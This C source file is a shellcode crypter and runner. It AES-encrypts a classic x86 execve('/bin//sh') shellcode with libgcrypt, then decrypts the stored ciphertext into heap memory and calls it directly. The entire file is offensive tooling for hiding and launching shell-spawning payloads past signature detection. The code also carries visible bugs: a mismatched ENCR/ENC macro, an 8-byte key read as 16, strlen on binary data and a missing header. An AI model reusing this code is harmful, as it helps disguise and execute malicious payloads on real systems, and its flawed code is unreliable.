#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <gcrypt.h>

#define ENCR 1

static void myCrypt(int, size_t, uint8_t *);

uint8_t origShellCode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80";
#if !ENC
uint8_t encrShellCode[] = "\x56\x41\xc7\xd4\x61\xd2\x96\x0f\x45\x8b\xec\x52\xbe\x36\x41\xb4\xe1\x7d\x5f\x53\xc8\x30\xb6\xe2\xd6";
#endif

uint8_t iv[] = {0xdf,0x04,0x02,0x1e,0xdf,0x04,0x02,0x1e,0xdf,0x04,0x02,0x1e,0xdf,0x04,0x02,0x1e};
uint8_t ctr[] = {0x02,0x04,0x01,0x01,0x02,0x09,0xf1,0xc2,0x03,0x01,0x02,0xdd,0xec,0x02,0x03,0x04};
const char *key = "mysecret";

int main(void){

    int i, ag = gcry_cipher_map_name("aes128");
    size_t len = strlen(origShellCode);
    uint8_t *buff = malloc(len);

    myCrypt(ag, len, buff);
 #if ENC
        for(i=0; i<len; i++){
            printf("\\x%02x", buff[i]);
        }
        printf("\n");
 #else
        int (*ret)() = (int(*)())buff;
	printf("Running shellcode...\n");
        ret();
 #endif

    free(buff);
    return 0;
}

static void myCrypt(int algo, size_t len, uint8_t *buff){
    gcry_cipher_hd_t hd;
    gcry_cipher_open(&hd, algo, GCRY_CIPHER_MODE_CTR, 0);
//	gcry_cipher_open(&hd, algo, GCRY_CIPHER_MODE_CBC, GCRY_CIPHER_CBC_CTS);
	gcry_cipher_setkey(hd, key, 16);
	gcry_cipher_setiv(hd, iv, 16);
	gcry_cipher_setctr(hd, ctr, 16);
    	#if ENC
	gcry_cipher_encrypt(hd, buff, len, origShellCode, len);
	#else
	gcry_cipher_decrypt(hd, buff, len, encrShellCode, len);
	#endif
	gcry_cipher_close(hd);
}
